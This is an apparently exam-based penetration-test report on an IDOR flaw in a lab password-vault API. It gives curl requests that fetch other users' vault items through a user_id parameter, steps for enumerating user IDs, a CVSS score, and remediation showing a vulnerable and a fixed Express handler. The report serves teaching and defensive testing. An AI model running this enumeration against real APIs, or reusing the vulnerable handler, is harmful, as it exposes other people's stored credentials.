# FailSafe PWPA Exam - Phase 3: API Vault IDOR Testing

**Date:** January 18, 2026
**Target:** http://10.0.0.10/api/vault

---

## IDOR Vulnerability Testing - API Vault Endpoint

### Vulnerability: Insecure Direct Object Reference (IDOR) - 25 points

**Description:**  
The `/api/vault/:token` endpoint fails to properly validate user authorization. An authenticated user can access another user's vault items by using their own authentication token in the GET request. The API does not verify that the token owner has permission to view the requested user's vault data.

**Impact:**  
Attackers can enumerate and access vault items (stored credentials) belonging to other users. This allows unauthorized access to sensitive stored passwords and usernames, leading to complete compromise of other users' accounts and data.

**Technical Details:**

**Vulnerable Endpoint:** GET /api/vault/:token
**Vulnerability Type:** Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA)
**Authentication Required:** Yes (valid API token)
**Authorization Check:** Missing/Insufficient

---

## Step-by-Step Recreation

### Prerequisites:
- Valid API token for any authenticated user
- Access to curl or Burp Suite
- Knowledge of target user ID or ability to enumerate

### Accounts Used:
- **Attacker Account:** testuser1 / test
- **Target Account:** Any other user (User 2, etc.)

### Step 1: Obtain API Token for Attacker Account

```bash
curl -X POST http://10.0.0.10/api/token \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser1","password":"test"}'
```

**Response:**
```json
{"token":"d70b4609-69cb-464c-9705-9d47ca4068ad"}
```

**Copy the token:** `d70b4609-69cb-464c-9705-9d47ca4068ad`

### Step 2: List Your Own Vault Items (Control)

```bash
curl -X GET "http://10.0.0.10/api/vault/d70b4609-69cb-464c-9705-9d47ca4068ad"
```

**Expected Response:**
```json
{"success":true,"data":[]}
```

(Empty or your own vault items)

### Step 3: Access Another User's Vault Items (IDOR)

```bash
curl -X GET "http://10.0.0.10/api/vault/d70b4609-69cb-464c-9705-9d47ca4068ad?user_id=2"
```

**Vulnerable Response (IDOR Confirmed):**
```json
{"success":true,"data":[{"itemid":10,"vaultusername":"ExampleUsername"}]}
```

**Analysis:** The API returns User 2's vault items without verifying authorization. The attacker (testuser1) successfully accessed another user's stored credentials using only their own token.

### Step 4: Enumerate Other Users' Vaults

```bash
# Test different user IDs
curl -X GET "http://10.0.0.10/api/vault/d70b4609-69cb-464c-9705-9d47ca4068ad?user_id=3"
curl -X GET "http://10.0.0.10/api/vault/d70b4609-69cb-464c-9705-9d47ca4068ad?user_id=4"
curl -X GET "http://10.0.0.10/api/vault/d70b4609-69cb-464c-9705-9d47ca4068ad?user_id=5"
```

This allows attackers to systematically enumerate and access all users' vault data.

---

## CVSS v3.1 Score

**CVSS v3.1 Score:** 8.8 (High)  
**Vector:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H  
**Rationale:** Network attack, low complexity, low privileges required (authenticated user), no user interaction, unchanged scope, high confidentiality/integrity/availability impact.

**Likelihood / Exploitability:**
- **Exploitability:** Easy - simple parameter modification
- **Required Access Level:** Low (authenticated user)
- **Technical Skill Required:** Low
- **Available Tools:** curl, Burp Suite, browser

---

## Remediation

1. **Implement proper authorization checks:**
   ```javascript
   // Vulnerable code
   app.get('/api/vault/:token', (req, res) => {
     const { token } = req.params;
     const userId = req.query.user_id;
     
     const vaultItems = db.query("SELECT * FROM vault WHERE user_id = ?", [userId]);
     res.json({ success: true, data: vaultItems });
   });

   // Secure code
   app.get('/api/vault/:token', (req, res) => {
     const { token } = req.params;
     
     // Verify token and get authenticated user
     const authenticatedUser = verifyToken(token);
     if (!authenticatedUser) {
       return res.status(401).json({ success: false, message: "Unauthorized" });
     }
     
     // Only allow access to own vault
     const vaultItems = db.query("SELECT * FROM vault WHERE user_id = ?", [authenticatedUser.id]);
     res.json({ success: true, data: vaultItems });
   });
   ```

2. **Remove user_id parameter** - Use authenticated token to determine user
3. **Validate token ownership** - Ensure token belongs to requesting user
4. **Implement role-based access control (RBAC)**
5. **Add audit logging** for vault access
6. **Implement rate limiting** on API endpoints

---

## Status

**Status:** Confirmed  
**Severity:** High  
**Points:** 25 (IDOR/Broken Object Level Authorization)

---

## Screenshots

[Screenshots to be added here]
- Screenshot of successful IDOR request showing User 2's vault items
- Screenshot of curl command and response
- Screenshot of different user_id parameter access
